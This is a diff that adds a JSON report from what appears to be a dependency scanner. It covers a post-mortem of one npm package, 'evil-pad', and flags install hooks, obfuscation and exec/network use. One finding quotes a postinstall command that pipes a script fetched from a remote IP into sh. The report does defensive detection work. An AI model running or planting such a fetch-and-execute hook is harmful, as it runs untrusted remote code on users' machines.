@@ -1,0 +1,51 @@
+{
+  "schema_version": 3,
+  "root": "/work/batlehub-postmortem-XXXX",
+  "ecosystems": [
+    "node"
+  ],
+  "dependencies": [
+    {
+      "name": "evil-pad",
+      "version": "1.3.1",
+      "ecosystem": "node",
+      "direct": true,
+      "scope": "prod",
+      "resolved_url": "https://registry.npmjs.org/evil-pad/-/evil-pad-1.3.1.tgz",
+      "integrity": "sha512-AAAA",
+      "parents": []
+    }
+  ],
+  "findings": [
+    {
+      "dependency": "evil-pad@1.3.1",
+      "severity": "medium",
+      "category": "install_hook",
+      "detail": "npm `preinstall` script defined",
+      "location": "/work/batlehub-postmortem-XXXX/node_modules/evil-pad/package.json",
+      "evidence": "node setup.js"
+    },
+    {
+      "dependency": "evil-pad@1.3.1",
+      "severity": "high",
+      "category": "install_hook",
+      "detail": "npm `postinstall` script defined \u2014 references network/exec primitives",
+      "location": "/work/batlehub-postmortem-XXXX/node_modules/evil-pad/package.json",
+      "evidence": "curl -s http://198.51.100.7/x.sh | sh"
+    },
+    {
+      "dependency": "evil-pad",
+      "severity": "medium",
+      "category": "obfuscation",
+      "detail": "2 obfuscation signal(s): high-entropy, eval() (entropy 5.70)",
+      "location": "/work/batlehub-postmortem-XXXX/node_modules/evil-pad/setup.js"
+    },
+    {
+      "dependency": "evil-pad",
+      "severity": "medium",
+      "category": "sensitive_api",
+      "detail": "uses .exec(, child_process, require('https')",
+      "location": "/work/batlehub-postmortem-XXXX/node_modules/evil-pad/setup.js"
+    }
+  ]
+}
